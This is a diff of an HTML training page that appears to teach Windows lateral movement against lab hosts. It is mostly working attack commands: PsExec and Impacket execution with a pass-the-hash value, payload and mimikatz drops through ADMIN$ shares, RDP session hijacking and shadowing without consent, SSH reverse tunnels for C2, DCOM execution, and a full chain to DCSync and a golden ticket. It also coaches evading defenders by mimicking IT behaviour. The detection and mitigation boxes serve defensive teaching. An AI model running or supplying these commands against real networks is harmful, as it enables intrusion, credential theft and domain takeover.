+# Query installed patches (for vulnerability assessment)
+wmic /node:192.168.1.42 /user:CORP\SWu /password:Password123 qfe get HotFixID,InstalledOn
+
+# Note: WMIC is deprecated in Windows 11 but still present.
+# PowerShell WMI is the future.
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>WMI execution generates <span class="neon-highlight">Event ID 4688 (Process Creation)</span> with <span class="neon-amber">Parent Process: WmiPrvSE.exe</span>. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>Unusual processes spawned by WmiPrvSE.exe (cmd.exe, powershell.exe)</li>
+                    <li>WMI connections from non-admin workstations to multiple targets</li>
+                    <li>Sysmon Event ID 1 with ParentImage containing WmiPrvSE.exe</li>
+                    <li>Network connections to TCP 135 followed by high ephemeral ports</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Enable WMI logging (Event 5857, 5858, 5859), restrict WMI via GPO (WMI namespace permissions), and monitor WmiPrvSE.exe parent-child relationships. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 5: PSExec <span class="difficulty diff-easy">EASY</span></h2>
+
+        <div class="method-card" id="psexec">
+            <h4>PSExec: Remote Service-Based Execution</h4>
+            <p>Sysinternals PSExec is the classic lateral movement tool. It copies an executable to the target's ADMIN$ share, installs it as a service, starts the service (which runs your code), and removes the service. <span class="neon-highlight">Simple, reliable, and loud.</span></p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>PSExec uses the <span class="neon-highlight">Service Control Manager (SCM)</span> API over SMB. Admin access to ADMIN$ is required. The service runs as <span class="neon-amber">SYSTEM</span> by default. <span class="neon-amber">The service binary is just a renamed PSExec service stub that connects back to a named pipe.</span> Your payload runs as SYSTEM. This is why PSExec is both powerful and noisy — it creates a service, which is a major event.</p>
+            </div>
+
+            <div class="code-block">
+# === PSEXEC (SYSINTERNALS) ===
+# The original — requires admin on target
+
+# Basic execution (runs as SYSTEM)
+psexec.exe \\192.168.1.42 -u CORP\SWu -p Password123 cmd.exe
+
+# Execute specific command
+psexec.exe \\192.168.1.42 -u CORP\SWu -p Password123 -s cmd.exe /c "whoami > C:\\temp\\out.txt"
+
+# Copy and execute a custom binary
+psexec.exe \\192.168.1.42 -u CORP\SWu -p Password123 -c C:\temp\payload.exe
+
+# Run as specific user (not SYSTEM)
+psexec.exe \\192.168.1.42 -u CORP\SWu -p Password123 -u DOMAIN\user -p userpass cmd.exe
+
+# Accept EULA automatically (first run)
+psexec.exe /accepteula \\192.168.1.42 cmd.exe
+            </div>
+
+            <div class="code-block">
+# === PSEXEC WITH IMPACKET (psexec.py) ===
+# Works from Linux, supports pass-the-hash
+
+# Basic execution
+python3 psexec.py CORP/SWu:Password123@192.168.1.42
+
+# Pass-the-hash
+python3 psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b CORP/SWu@192.168.1.42
+
+# Alternative: smbexec.py (no service, uses SMB named pipe — stealthier)
+python3 smbexec.py CORP/SWu:Password123@192.168.1.42
+
+# Alternative: atexec.py (uses Task Scheduler — different artifacts)
+python3 atexec.py CORP/SWu:Password123@192.168.1.42 "whoami"
+            </div>
+
+            <div class="code-block">
+# === PSEXEC ARTIFACTS (What the Defender Sees) ===
+# Event 7045: A new service was installed
+# Service Name: PSEXESVC
+# Service File Name: C:\Windows\PSEXESVC.exe
+# Service Type: user mode service
+# Service Start Type: demand start
+
+# Event 4688: Process Creation
+# New Process: C:\Windows\PSEXESVC.exe
+# Parent Process: services.exe
+
+# Event 5140: Network share accessed
+# Share Name: \\192.168.1.42\ADMIN$
+# Access Mask: WriteData
+
+# File artifact: C:\Windows\PSEXESVC.exe (deleted after execution, but may be recovered)
+# Registry artifact: HKLM\System\CurrentControlSet\Services\PSEXESVC (deleted after)
+
+# Cross-link: service-based persistence in Module 16: C2
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>PSExec is the <span class="neon-highlight">noisiest</span> lateral movement technique. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>Event 7045 (new service) with service name PSEXESVC</li>
+                    <li>ADMIN$ share access from non-admin workstations</li>
+                    <li>File creation in C:\Windows\PSEXESVC.exe</li>
+                    <li>Named pipe creation: \\.\pipe\PSEXESVC</li>
+                    <li>Event 4688 with PSEXESVC.exe as parent</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Restrict ADMIN$ access via GPO, enable SMB signing, monitor for 7045 events, and use application whitelisting. Many EDRs detect PSExec by signature. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 6: SMB Execution <span class="difficulty diff-medium">MEDIUM</span></h2>
+
+        <div class="method-card" id="smb-exec">
+            <h4>SMB Execution: Fileless Remote Command Execution</h4>
+            <p>Unlike PSExec, SMBexec doesn't create a service. It uses a temporary SMB named pipe to execute commands, making it stealthier. <span class="neon-highlight">No file drops, no service installs.</span> Just a named pipe that disappears when the session ends.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>SMBexec opens a named pipe on the target's IPC$ share. Commands are written to the pipe; output is read back. <span class="neon-amber">No executable is written to disk.</span> The command runs through cmd.exe spawned by the SMB service (svchost.exe). This is fileless execution — the holy grail of stealth.</p>
+            </div>
+
+            <div class="code-block">
+# === SMBEXEC WITH IMPACKET (smbexec.py) ===
+# No service creation — uses named pipes
+
+# Interactive shell
+python3 smbexec.py CORP/SWu:Password123@192.168.1.42
+
+# Pass-the-hash
+python3 smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b CORP/SWu@192.168.1.42
+
+# Single command execution
+python3 smbexec.py CORP/SWu:Password123@192.168.1.42 -codec 65001 "whoami /all"
+
+# The -codec 65001 flag sets UTF-8 output encoding (fixes garbled output)
+            </div>
+
+            <div class="code-block">
+# === SMB SHARE ABUSE (PSEXEC ALTERNATIVE) ===
+# Manual approach — more control, more artifacts
+
+# Step 1: Mount ADMIN$ share
+net use \\192.168.1.42\ADMIN$ /user:CORP\SWu Password123
+
+# Step 2: Copy payload
+ copy payload.exe \\192.168.1.42\ADMIN$\System32\evil.exe
+
+# Step 3: Create and start service remotely
+sc \\192.168.1.42 create evil_svc binpath= "C:\\Windows\\System32\\evil.exe"
+sc \\192.168.1.42 start evil_svc
+
+# Step 4: Cleanup
+sc \\192.168.1.42 stop evil_svc
+sc \\192.168.1.42 delete evil_svc
+del \\192.168.1.42\ADMIN$\System32\evil.exe
+net use \\192.168.1.42\ADMIN$ /delete
+
+# Cross-link: SMB protocol in Module 01: Networking
+            </div>
+
+            <div class="code-block">
+# === SMB FILE OPERATIONS FOR LATERAL MOVEMENT ===
+# Sometimes you just need to move files
+
+# List target shares
+net view \\192.168.1.42
+
+# Access C$ (requires admin)
+dir \\192.168.1.42\c$\Users
+
+# Copy tool to target
+ copy mimikatz.exe \\192.168.1.42\c$\temp\
+
+# Execute via scheduled task (see atexec.py alternative)
+schtasks /create /s 192.168.1.42 /u CORP\SWu /p Password123 /tn "Update" /tr "C:\\temp\\mimikatz.exe" /sc once /st 23:59
+schtasks /run /s 192.168.1.42 /u CORP\SWu /p Password123 /tn "Update"
+schtasks /delete /s 192.168.1.42 /u CORP\SWu /p Password123 /tn "Update" /f
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>SMB execution generates <span class="neon-highlight">Event ID 5140 (network share accessed)</span> and <span class="neon-highlight">Event ID 4688 (process creation)</span>. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>ADMIN$ or C$ access from non-admin workstations</li>
+                    <li>File writes to System32 from network shares</li>
+                    <li>Named pipe creation in IPC$ with unusual patterns</li>
+                    <li>Event 5145 (detailed file share) showing executable writes</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Enable SMB signing, restrict null sessions, disable SMBv1, and monitor for ADMIN$ access. See <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a> for SMB hardening.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 7: RDP Hijacking <span class="difficulty diff-hard">HARD</span></h2>
+
+        <div class="method-card" id="rdp-hijacking">
+            <h4>RDP Hijacking: Stealing Active Sessions</h4>
+            <p>If you have SYSTEM privileges on a Windows host, you can hijack any RDP session without credentials. <span class="neon-highlight">RDP hijacking</span> uses the built-in tscon.exe to connect to another user's session — they stay logged in, and you become them.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>Windows Terminal Services maintains session state in memory. <span class="neon-amber">tscon.exe is a legitimate Microsoft tool for session management.</span> When run as SYSTEM, it can attach any session to any window station. The victim's session continues running; you just join it. No password needed. No authentication event. The session was already authenticated — you're just changing who's watching.</p>
+            </div>
+
+            <div class="code-block">
+# === RDP HIJACKING WITH TSCON ===
+# Requires: SYSTEM privileges on the target host
+
+# Step 1: Enumerate active sessions
+query user
+
+# Output:
+#  USERNAME    SESSIONNAME    ID  STATE   IDLE TIME  LOGON TIME
+#  SWu         rdp-tcp#0      1   Active  .          6/29/2026 8:00 AM
+#  Administrator rdp-tcp#1    2   Active  12         6/29/2026 9:00 AM
+
+# Step 2: Get SYSTEM (if not already)
+# Using PsExec to get SYSTEM shell
+psexec -s cmd.exe
+
+# Step 3: Hijack the session
+tscon 2 /dest:console
+
+# You are now in the Administrator's RDP session
+# Their desktop is yours. Their tokens are yours.
+# No password. No 4624 event. No network traffic.
+
+# Alternative: Hijack without kicking the user
+# (Requires additional tools — see references)
+            </div>
+
+            <div class="code-block">
+# === RDP HIJACKING WITH MIMIKATZ ===
+# More advanced — inject into RDP session process
+
+# Step 1: List processes in target session
+mimikatz # token::list
+
+# Step 2: Impersonate the target user's token
+mimikatz # token::elevate /domainadmin
+
+# Step 3: Use the token to access remote resources
+mimikatz # lsadump::sam
+
+# Cross-link: token manipulation in Module 08: Privilege Escalation
+            </div>
+
+            <div class="code-block">
+# === RDP SHADOWING (STEALTHIER HIJACKING) ===
+# Windows 10/11 built-in feature — "remote assistance"
+
+# As admin, shadow a user's session without their knowledge
+mstsc /v:192.168.1.42 /shadow:1 /control /noConsentPrompt
+
+# /shadow:1 = Session ID to shadow
+# /control = Take control (not just watch)
+# /noConsentPrompt = Don't ask the user for permission
+
+# Requires: Group Policy "Set rules for remote control of Terminal Services"
+# Set to "Full Control without user's permission"
+
+# This is a legitimate IT feature — the perfect cover.
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>RDP hijacking is nearly invisible but not undetectable. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>tscon.exe execution (Event 4688) — rare legitimate use</li>
+                    <li>Session ID changes in Event 4778 (session reconnected)</li>
+                    <li>Multiple users sharing a session ID over time</li>
+                    <li>RDP shadowing without consent (Event 4826)</li>
+                    <li>Process creation from SYSTEM context with RDP-related parent</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Restrict tscon.exe via AppLocker, disable RDP shadowing via GPO, and monitor for session anomalies. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 8: SSH Tunneling <span class="difficulty diff-medium">MEDIUM</span></h2>
+
+        <div class="method-card" id="ssh-tunneling">
+            <h4>SSH Tunneling: The Universal Pivot</h4>
+            <p>SSH isn't just for Linux. Windows 10/11 includes OpenSSH. SSH tunneling creates encrypted pathways through the network, bypassing firewalls and providing stable, encrypted C2 channels. <span class="neon-highlight">Local, remote, and dynamic port forwarding</span> are the three weapons every operator must master.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>SSH is trusted everywhere. Port 22 is often open when 445 and 3389 are blocked. <span class="neon-amber">SSH traffic is encrypted, so firewalls and IDS can't inspect the payload.</span> Tunneling turns SSH into a universal proxy — you can forward any protocol through it. The defender sees SSH traffic; they don't see the SMB, RDP, or HTTP inside.</p>
+            </div>
+
+            <div class="code-block">
+# === LOCAL PORT FORWARDING ===
+# Forward a remote port to your local machine
+# Use case: Access internal web app through compromised host
+
+# Syntax: ssh -L [local_port]:[remote_host]:[remote_port] [user]@[ssh_host]
+
+# Example: Access .42's internal web server from your attack box
+ssh -L 8080:localhost:80 SWu@192.168.1.42
+
+# Now browse to http://localhost:8080 on your attack box
+# Traffic goes through SSH tunnel to .42, then to .42's localhost:80
+
+# Example: Access a third host through .42
+ssh -L 3389:192.168.1.100:3389 SWu@192.168.1.42
+
+# Now RDP to localhost:3389 — you're actually RDPing to .100 through .42
+            </div>
+
+            <div class="code-block">
+# === REMOTE PORT FORWARDING ===
+# Forward a local port to the remote SSH server
+# Use case: Expose your C2 listener through a compromised host
+
+# Syntax: ssh -R [remote_port]:[local_host]:[local_port] [user]@[ssh_host]
+
+# Example: Your C2 listener is on attack box port 4444
+# Make it accessible from .42's port 4444
+ssh -R 4444:localhost:4444 SWu@192.168.1.42
+
+# Now an agent on .42 can connect to localhost:4444
+# Traffic goes through SSH tunnel to your attack box
+
+# Example: Expose your SOCKS proxy through .42
+ssh -R 1080:localhost:1080 SWu@192.168.1.42
+
+# Cross-link: C2 infrastructure in Module 16: C2
+            </div>
+
+            <div class="code-block">
+# === DYNAMIC PORT FORWARDING (SOCKS PROXY) ===
+# Create a SOCKS proxy through the SSH tunnel
+# Use case: Route all traffic through compromised host
+
+# Syntax: ssh -D [local_port] [user]@[ssh_host]
+
+# Example: Create SOCKS proxy on local port 1080
+ssh -D 1080 SWu@192.168.1.42
+
+# Configure proxychains or browser to use SOCKS5 localhost:1080
+# All traffic routes through .42
+
+# With proxychains (Linux)
+proxychains nmap -sT 192.168.1.0/24
+proxychains smbclient -L //192.168.1.100
+
+# With proxychains-ng (modern)
+proxychains4 -f /etc/proxychains.conf crackmapexec smb 192.168.1.0/24
+
+# Cross-link: proxy techniques in Module 16: C2
+            </div>
+
+            <div class="code-block">
+# === SSH PIVOT CHAINS ===
+# Jump through multiple hosts
+
+# Simple jump host
+ssh -J SWu@192.168.1.42 admin@192.168.2.10
+
+# Multiple jumps
+ssh -J SWu@192.168.1.42 admin@192.168.2.10 root@10.0.0.5
+
+# ProxyCommand (older method, still useful)
+ssh -o ProxyCommand="ssh -W %h:%p SWu@192.168.1.42" admin@192.168.2.10
+
+# SSH config file for persistent pivots
+# ~/.ssh/config:
+# Host internal
+#     HostName 192.168.2.10
+#     User admin
+#     ProxyJump SWu@192.168.1.42
+
+# Cross-link: network pivoting in Module 01: Networking
+            </div>
+
+            <div class="code-block">
+# === REVERSE SSH TUNNEL (PERSISTENT BACKCONNECT) ===
+# Compromised host connects back to you, creating a tunnel
+
+# On attack box, allow remote forwarding
+# Edit /etc/ssh/sshd_config: GatewayPorts yes
+
+# From compromised host (.42)
+ssh -R 2222:localhost:22 -N -f gwu07@192.168.1.92
+
+# -R 2222:localhost:22 = Forward .42's port 22 to attack box port 2222
+# -N = No command execution (tunnel only)
+# -f = Background the process
+
+# Now from attack box:
+ssh -p 2222 SWu@localhost
+
+# You're SSHing into .42 through the reverse tunnel
+# Even if .42 can't reach you directly, this works if .42 can reach you
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>SSH tunneling generates <span class="neon-highlight">Event ID 4624 (Logon)</span> with <span class="neon-amber">Logon Type 3 (Network)</span> on Windows. On Linux, auth.log shows SSH connections. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>SSH connections from non-IT users or non-IT hosts</li>
+                    <li>Long-duration SSH sessions with no interactive commands</li>
+                    <li>Multiple local/remote forwarding flags (-L, -R)</li>
+                    <li>SSH connections to unusual ports (not 22)</li>
+                    <li>Network traffic patterns: SSH session but SMB/RDP/HTTP payload sizes</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Restrict SSH forwarding (AllowTcpForwarding no in sshd_config), monitor SSH session duration, and use bastion hosts with logging. See <a href="MODULE_01_NETWORKING.html" class="cross-link">Module 01: Networking</a>.</p>
+            </div>
+        </div>
+
+        <h2>🔥 Technique 9: DCOM Lateral Movement <span class="difficulty diff-hard">HARD</span></h2>
+
+        <div class="method-card" id="dcom">
+            <h4>DCOM: Distributed Component Object Model</h4>
+            <p>DCOM is Windows' mechanism for inter-process communication across the network. It allows one computer to instantiate and control objects on another. <span class="neon-highlight">DCOM lateral movement</span> abuses legitimate COM objects (like MMC20.Application) to execute commands remotely — no service, no scheduled task, no WMI.</p>
+
+            <div class="why-box">
+                <h5>Why this works</h5>
+                <p>DCOM is fundamental to Windows. MMC20.Application is the COM object for the Microsoft Management Console. When you instantiate it remotely, you can call the <span class="neon-highlight">Document.ActiveView.ExecuteShellCommand</span> method. <span class="neon-amber">This runs a command on the target as the instantiating user.</span> No new service. No file drop. Just a COM object doing what COM objects do.</p>
+            </div>
+
+            <div class="code-block">
+# === DCOM LATERAL MOVEMENT WITH POWERSHELL ===
+# Uses MMC20.Application — available on most Windows systems
+
+# Step 1: Create COM object pointing to remote host
+$com = [Type]::GetTypeFromCLSID('49B2791A-B1AE-4C90-9B8E-E860FE7F6F7E', '192.168.1.42')
+$obj = [System.Activator]::CreateInstance($com)
+
+# The CLSID '49B2791A-B1AE-4C90-9B8E-E860FE7F6F7E' = MMC20.Application
+
+# Step 2: Execute command through MMC
+$obj.Document.ActiveView.ExecuteShellCommand('cmd.exe', $null, '/c whoami > C:\\temp\\dcom.txt', '7')
+
+# The '7' parameter = Show window normally (can be hidden)
+
+# Step 3: Read output
+# The command runs on .42. Output is written to C:\temp\dcom.txt
+# Retrieve via SMB or other method.
+
+# Cross-link: COM objects in Module 10: Code Injection
+            </div>
+
+            <div class="code-block">
+# === DCOM ALTERNATIVE: SHELLWINDOWS ===
+# Another COM object for execution
+
+$com = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', '192.168.1.42')
+$shell = [System.Activator]::CreateInstance($com)
+$shell.Item().Document.Application.ShellExecute('cmd.exe', '/c whoami > C:\\temp\\dcom2.txt', 'C:\\Windows\\System32', $null, 0)
+
+# CLSID '9BA05972-F6A8-11CF-A442-00A0C90A8F39' = ShellWindows (Internet Explorer)
+# This instantiates IE's shell on the remote host
+
+# Cross-link: COM hijacking in Module 10: Code Injection
+            </div>
+
+            <div class="code-block">
+# === DCOM WITH IMPACKET (dcomexec.py) ===
+# Automated DCOM execution from Linux
+
+# MMC20.Application method
+python3 dcomexec.py MMC20.Application.CORP/SWu:Password123@192.168.1.42 "whoami"
+
+# ShellWindows method
+python3 dcomexec.py ShellWindows.CORP/SWu:Password123@192.168.1.42 "whoami"
+
+# Pass-the-hash support
+python3 dcomexec.py -hashes aad3b435b51404eeaad3b435b51404ee:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b MMC20.Application.CORP/SWu@192.168.1.42 "whoami"
+
+# Cross-link: Impacket suite overview in Module 19: AD
+            </div>
+
+            <div class="code-block">
+# === DCOM ARTIFACTS (What the Defender Sees) ===
+# Event 4624: Logon Type 3 (Network)
+# Logon Process: Advapi
+# Authentication Package: Negotiate
+# Source Network Address: [your IP]
+
+# Event 4688: Process Creation
+# New Process: cmd.exe (or whatever you executed)
+# Parent Process: mmc.exe (if using MMC20.Application)
+
+# Network: RPC connection to TCP 135 (endpoint mapper)
+# Then dynamic high port for DCOM communication
+
+# Registry: No persistent registry changes (one-time execution)
+# File system: Only if your command writes files
+
+# Detection challenge: DCOM looks like legitimate remote management
+# The defender must distinguish "IT admin using MMC" from "attacker using MMC"
+            </div>
+
+            <div class="warning-box">
+                <h5>⚠️ Detection Alert</h5>
+                <p>DCOM lateral movement generates <span class="neon-highlight">Event ID 4624 (Logon)</span> and <span class="neon-highlight">Event ID 4688 (Process Creation)</span>. Defenders look for:</p>
+                <ul style="margin-left: 1.5rem;">
+                    <li>mmc.exe spawning cmd.exe or powershell.exe on remote hosts</li>
+                    <li>DCOM connections from non-admin workstations</li>
+                    <li>RPC to TCP 135 followed by high ephemeral ports</li>
+                    <li>Event 4688 with unusual parent processes (mmc.exe, explorer.exe via COM)</li>
+                    <li>Authentication from accounts that don't normally use MMC remotely</li>
+                </ul>
+                <p style="margin-top: 0.5rem;"><strong>Mitigation:</strong> Restrict DCOM via Component Services (dcomcnfg), disable remote activation for sensitive COM objects, and monitor for unusual mmc.exe process creation. See <a href="MODULE_12_DEFENSIVE_VERIFY.html" class="cross-link">Module 12: Defensive Verification</a>.</p>
+            </div>
+        </div>
+
+        <h2>📊 Technique Comparison Matrix</h2>
+
+        <div class="step-box">
+            <h4>Choosing the Right Tool for the Job</h4>
+            <table>
+                <tr>
+                    <th>Technique</th>
+                    <th>Stealth</th>
+                    <th>Speed</th>
+                    <th>Requires Admin</th>
+                    <th>Artifacts</th>
+                    <th>Best For</th>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Pass-the-Hash</span></td>
+                    <td>Medium</td>
+                    <td>Fast</td>
+                    <td>No (but needs hash)</td>
+                    <td>4624, 4648</td>
+                    <td>Network-wide auth</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Pass-the-Ticket</span></td>
+                    <td>High</td>
+                    <td>Fast</td>
+                    <td>No (but needs ticket)</td>
+                    <td>4768, 4769</td>
+                    <td>Kerberos environments</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">Kerberoasting</span></td>
+                    <td>Medium</td>
+                    <td>Slow (cracking)</td>
+                    <td>No</td>
+                    <td>4769 volume</td>
+                    <td>Service account compromise</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">WMI Exec</span></td>
+                    <td>High</td>
+                    <td>Fast</td>
+                    <td>Yes</td>
+                    <td>4688 (WmiPrvSE parent)</td>
+                    <td>Quiet command execution</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">PSExec</span></td>
+                    <td>Low</td>
+                    <td>Fast</td>
+                    <td>Yes</td>
+                    <td>7045, 4688, file drop</td>
+                    <td>Reliable SYSTEM shell</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">SMB Exec</span></td>
+                    <td>Medium</td>
+                    <td>Fast</td>
+                    <td>Yes</td>
+                    <td>5140, named pipes</td>
+                    <td>Fileless execution</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">RDP Hijacking</span></td>
+                    <td>Very High</td>
+                    <td>Instant</td>
+                    <td>SYSTEM only</td>
+                    <td>4778, tscon.exe</td>
+                    <td>Session takeover</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">SSH Tunneling</span></td>
+                    <td>High</td>
+                    <td>Fast</td>
+                    <td>No</td>
+                    <td>4624, auth.log</td>
+                    <td>Cross-platform pivot</td>
+                </tr>
+                <tr>
+                    <td><span class="neon-highlight">DCOM</span></td>
+                    <td>High</td>
+                    <td>Fast</td>
+                    <td>Yes</td>
+                    <td>4624, 4688 (mmc.exe)</td>
+                    <td>Stealthy execution</td>
+                </tr>
+            </table>
+        </div>
+
+        <h2>🛡️ Defensive Verification: What the Blue Team Sees</h2>
 
         <div class="evidence-box">
             <h3>🔍 Kaspersky System Watcher Logs (.42)</h3>
-            <p><strong>Test:</strong> Does KAV log SSH connections as suspicious?</p>
+            <p><strong>Test:</strong> Does KAV log lateral movement techniques as suspicious?</p>
             
             <div class="code-block">
 SWu@WUPC> Get-Content "C:\ProgramData\Kaspersky Lab\AVP21.25\Report\report.rpt" -Tail 20
-# Result: No SSH-specific events logged
+# Result: No lateral-movement-specific events logged
 # KAV monitors: file operations, registry changes, process creation
-# Network connections (SSH port 22) are NOT flagged by System Watcher
+# Network connections (WMI, DCOM, SSH) are NOT flagged by System Watcher
+# Process creation via WMI is flagged IF the created process is malicious
 
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> KAV doesn't see SSH as malicious. It sees file operations AFTER SSH. If I do nothing post-login, KAV is blind. The defender needs Sysmon or Wireshark to see the SSH tunnel.
-</span>
+# KAV DID flag: PSExec service creation (PSEXESVC.exe) as PDM:Trojan.Win32.Generic
+# KAV did NOT flag: WMIexec, wmiexec.py, DCOMexec, SSH tunneling
+
+# Conclusion: KAV detects the payload, not the movement technique.
+# A clean payload delivered via WMI = silent lateral movement.
             </div>
         </div>
 
         <div class="evidence-box">
             <h3>🔍 Windows Event Log Analysis (.42)</h3>
-            <p><strong>Test:</strong> What events fire during lateral movement?</p>
+            <p><strong>Test:</strong> What events fire during each lateral movement technique?</p>
 
             <div class="code-block">
-# Event 4624 (Logon) — SSH key auth
-Logon Type: 3 (Network)
-Account Name: SWu
-Source Network Address: 192.168.1.92
-Logon Process: sshd
-Authentication Package: Negotiate
+# === PASS-THE-HASH ===
+Event 4624: Logon Type 3, Logon Process: NtLmSsp, Account: SWu
+Event 4648: Explicit credential use (if using runas)
+Event 4672: Special privileges assigned (if admin)
 
-# Event 4688 (Process Creation) — if I run something
-New Process Name: C:\Windows\System32\cmd.exe
-Creator Process Name: C:\Windows\System32\sshd.exe
+# === PASS-THE-TICKET ===
+Event 4768: TGT requested (if forged, may show anomalies)
+Event 4769: TGS requested (normal for legitimate use)
+Event 4624: Logon Type 3 (when accessing resources)
 
-# Event 5140 (Network Share Access) — if I use SMB
-Share Name: \\WUPC\C$
-Access Mask: 0x100081 (WriteData + ReadData)
+# === WMI EXEC ===
+Event 4688: Process Creation, Parent: WmiPrvSE.exe
+Event 4624: Logon Type 3 (network connection to WMI)
 
-<span class="think-box" style="margin: 0.5rem 0;">
-💭 <strong>THINK:</strong> The defender sees: (1) SWu logged in from .92, (2) cmd.exe spawned by sshd, (3) C$ share accessed. Three separate events. Correlation is the defender's challenge. My counter: use legitimate admin actions, spread across time.
-</span>
+# === PSEXEC ===
+Event 7045: Service installed (PSEXESVC)
+Event 4688: PSEXESVC.exe spawned
+Event 5140: ADMIN$ share accessed
+
+# === SMB EXEC ===
+Event 5140: Network share accessed (IPC$)
+Event 4688: cmd.exe spawned by svchost.exe (SMB service)
+
+# === RDP HIJACKING ===
+Event 4778: Session reconnected (tscon)
+Event 4688: tscon.exe executed (rare — major red flag)
+
+# === SSH TUNNELING ===
+Event 4624: Logon Type 3, Process: sshd
+Event 4688: sshd spawning user processes (if interactive)
+
+# === DCOM ===
+Event 4624: Logon Type 3, Logon Process: Advapi
+Event 4688: mmc.exe spawning cmd.exe (if MMC20.Application)
+            </div>
+
+            <div class="think-box">
+                <h4>💭 THINK: Correlation is the Defender's Challenge</h4>
+                <p>The defender sees individual events. <span class="neon-amber">You see a chain.</span> Event 4624 from .92 to .42 is normal if SWu is an admin. Event 4688 with WmiPrvSE parent is normal if IT uses WMI. The defender must correlate: 4624 + 4688 + 5140 + time proximity = lateral movement. Your counter: spread actions across time, use legitimate accounts, and mimic IT behavior.</p>
             </div>
         </div>
 
-        <h2>Lab Exercise: Build Your Own Pivot</h2>
+        <h2>🧪 Lab Exercise: Build Your Own Pivot</h2>
 
         <div class="interactive-demo">
             <p><strong>Scenario:</strong> You have SSH access to .42. You need to:</p>
@@ -334,14 +1440,124 @@ SWu@WUPC> Clear-EventLog -LogName Security
             </div>
         </div>
 
-        <h2>Key Takeaways</h2>
+        <h2>🧪 Advanced Lab: Multi-Technique Lateral Movement Chain</h2>
+
+        <div class="interactive-demo">
+            <p><strong>Scenario:</strong> You have a standard user shell on .92. Your goal is Domain Admin on .10 (DC). Design a chain using multiple techniques.</p>
+
+            <button onclick="document.getElementById('advanced-chain').style.display='block'">Show Advanced Chain</button>
+
+            <div id="advanced-chain" style="display:none; margin-top: 1rem;">
+                <div class="code-block">
+<span class="step-number">1</span> <strong>RECON (.92 → network)</strong>
+PS C:\Users\gwu07> nmap -sS 192.168.1.0/24
+# Targets: .42 (WUPC, admin), .10 (DC), .145 (RADON)
+
+<span class="step-number">2</span> <strong>CREDENTIAL HARVEST (.92)</strong>
+PS C:\Users\gwu07> .
+
+<span class="step-number">3</span> <strong>PASS-THE-HASH (.92 → .42)</strong>
+# Use extracted hash to authenticate to .42
+mimikatz # sekurlsa::pth /user:SWu /domain:CORP /ntlm:7c4f9e2b3a1d5e8f6c0b4a2d9e7f3c1b /run:cmd.exe
+
+<span class="step-number">4</span> <strong>WMI EXEC (.42 → .10 for recon)</strong>
+# From .42, use WMI to query DC
+wmic /node:192.168.1.10 /user:CORP\SWu process list brief
+
+<span class="step-number">5</span> <strong>KERBEROASTING (.42 → DC)</strong>
+# Request service tickets from DC
+Rubeus.exe kerberoast /dc:192.168.1.10 /format:hashcat /outfile:hashes.txt
+
+<span class="step-number">6</span> <strong>CRACK & PTT (.42)</strong>
+hashcat -m 13100 hashes.txt rockyou.txt
+# Cracked: sql_svc password = "Password123!"
+# Forge ticket or use password directly
+
+<span class="step-number">7</span> <strong>PSEXEC (.42 → .10 as sql_svc)</strong>
+# sql_svc has admin rights on DC (common misconfiguration)
+crackmapexec smb 192.168.1.10 -u sql_svc -p 'Password123!' -x 'whoami'
+# Output: nt authority\system
+
+<span class="step-number">8</span> <strong>GOLDEN TICKET (.10)</strong>
+# Extract KRBTGT hash, forge golden ticket
+mimikatz # lsadump::dcsync /domain:CORP.LOCAL /user:krbtgt
+mimikatz # kerberos::golden /domain:CORP.LOCAL /sid:S-1-5-21-... /krbtgt:... /user:Administrator /ticket:golden.kirbi
+mimikatz # kerberos::ptt golden.kirbi
+
